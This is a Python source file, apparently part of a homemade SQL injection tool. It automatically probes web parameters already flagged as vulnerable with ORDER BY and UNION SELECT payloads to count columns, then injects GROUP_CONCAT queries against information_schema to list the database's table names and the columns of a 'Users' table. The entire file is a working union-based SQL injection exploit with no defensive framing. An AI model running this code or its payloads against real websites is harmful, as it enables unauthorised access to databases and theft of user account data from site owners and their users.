# from utils.ainsi import *
# from utils.objects.vuln_link import vuln_link 

# import sys, requests



import requests
from utils.ainsi import *
from utils.objects.vuln_link import *
from urllib.parse import urlparse
import re
from bs4 import BeautifulSoup

def generate_union_select_marker_payload(number):
    buffer = ""
    base_payload = "' UNION SELECT "
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    end_payload = "-- -"
    if number > len(chars):
        return None
    
    buffer += base_payload
    print(len(chars))
    for i in range(0, number):
        buffer += "'MARKER_" + chars[i] + "'"
        if i < number - 1:
            buffer+= ","
    buffer += end_payload
    return buffer

def generate_union_select_null_payload(number):
    buffer = None
    base_payload = "' UNION SELECT "
    marker = "NULL"
    end_payload = "-- -"
    
    if (number < 1):
        return None
    buffer = base_payload
    for i in range (0, number):
        buffer += marker
        if i < number - 1:
            buffer += ","
    buffer += end_payload
    return (buffer)
    
    
def generate_marker_to_find(number):
        base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        chars = set()
        if (number > len(base)):
            return chars
        for i in range(0, number):
            chars.add("MARKER_" + base[i])
        chars = sorted(chars)
        return chars   


def get_injection(vuln_links):
    
    for vuln_link in vuln_links:
        try :
            identified_db, link, query_params, success = vuln_link.get_infos()
            parsed_url = urlparse(link)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            # print(f"[{colored(link, RED)}]]")
            
            # response = perform_request(link)
            # response.encoding = "utf-8"
            
            # first_page = response.text
            get_union_based_injection(query_params, base_url)
            

        except Exception as e:
            print(f"{colored('ERROR INJECTION : ', RED, styles=UNDERLINE)}")


def get_union_lines_response(response):
    texts = []
    
    soup = BeautifulSoup(response.text, "html.parser")
    extracted = soup.find_all(string=True)
    
    for text in extracted:
        texts.append(text)
    return texts
    
def perform_request(link):
    try:
        response = requests.get(link)
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException as e:
        print(f"{colored('Failed to request ', RED)} {colored(link, BRIGHT_RED, styles=BOLD)}: {e}")
        return None


#? GETTING NUMBERS OF COLUMNS
def get_union_columns_size(query_params, base_url):
    columns = 0
    
    #! ' ORDER BY 2-- -
    for i in range(0, 52):
        payload = f"' ORDER BY {i}-- -"
        
        params = query_params.copy() if isinstance(query_params, dict) else {}
        
        param_name = list(params.keys())[0] if params else query_params
        params[param_name] = payload
        
        response = requests.get(base_url, params=params)
        if "Unknown column" in response.text and i != 0:
            columns = i - 1
            break
    
    #! ' UNION SELECT NULL,NULL -- -
    if columns == 0:
        for i in range(1,52):
            payload = generate_union_select_null_payload(i)

            params = query_params.copy() if isinstance(query_params, dict) else {}
            
            param_name = list(params.keys())[0] if params else query_params
            params[param_name] = payload
            
            response = requests.get(base_url, params=params)
            
            if "expects" not in response.text:
                columns = i
                break
        
    return columns

def get_union_based_injection(query_params, base_url):
        
        
        #! SEARCH FOR NUM OF COLUMNS
        columns = get_union_columns_size(query_params, base_url)
        print(f"columns find {colored(str(columns), GREEN, styles=BOLD)}")
        if columns < 2:
            return None
       
        
        #! INJECTING PARAMETERS TO FIND CATEGORY
        payload = generate_union_select_marker_payload(columns)
        params = query_params.copy() if isinstance(query_params, dict) else {}
        param_name = list(params.keys())[0] if params else query_params
        params[param_name] = payload
        
        response = requests.get(base_url, params=params)
        
        marker_to_find = generate_marker_to_find(columns)

        #! 1 : FINDING MARKER POS IN PAGE
        base_lines = get_union_lines_response(response)
        
        print(f"{colored(payload, background=BG_RED)}")
        for element in base_lines:            
            if element == '\n': 
                pass
            else:
                print(f"[{colored(element, GREEN)}]")
            
        
        #! 2 : FINDING TABLE NAME 
        payload = "' UNION SELECT GROUP_CONCAT(table_name), 2, 3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"
        params = query_params.copy() if isinstance(query_params, dict) else {}
        
        param_name = list(params.keys())[0] if params else query_params
        params[param_name] = payload
        response = requests.get(base_url, params=params)
        
        soup = BeautifulSoup(response.text, "html.parser")
        lines_table = soup.find_all(string=True)
        
        print(f"{colored(payload, background=BG_RED)}")
        for element in lines_table:            
            if element == '\n': 
                pass
            else:
                print(f"[{colored(element, YELLOW)}]")
                
                
        #? COMPARING BASE_LINE
        for base_line, tables_line in zip(base_lines, lines_table):
            if base_line in marker_to_find and not tables_line.isdigit():
                print(f"{colored(tables_line, background=BG_GREEN)}")            
        
        #! 3 : FINDING COLUMN_NAME
        payload = "' UNION SELECT GROUP_CONCAT(column_name),2 , 3 FROM information_schema.columns WHERE table_name='Users'-- -"
        params = query_params.copy() if isinstance(query_params, dict) else {}
        
        param_name = list(params.keys())[0] if params else query_params
        params[param_name] = payload
        response = requests.get(base_url, params=params)
        
        soup = BeautifulSoup(response.text, "html.parser")
        lines_columns = soup.find_all(string=True)
        
        print(f"{colored(payload, background=BG_RED)}")
        for element in lines_columns:            
                if element == '\n': 
                    pass
                else:
                    print(f"[{colored(element, RED)}]")
            
        for base_line, line_columns in zip(base_lines, lines_columns):
            if base_line in marker_to_find and not line_columns.isdigit():
                print(f"{colored(line_columns, background=BG_GREEN)}") 
            
        print()
        

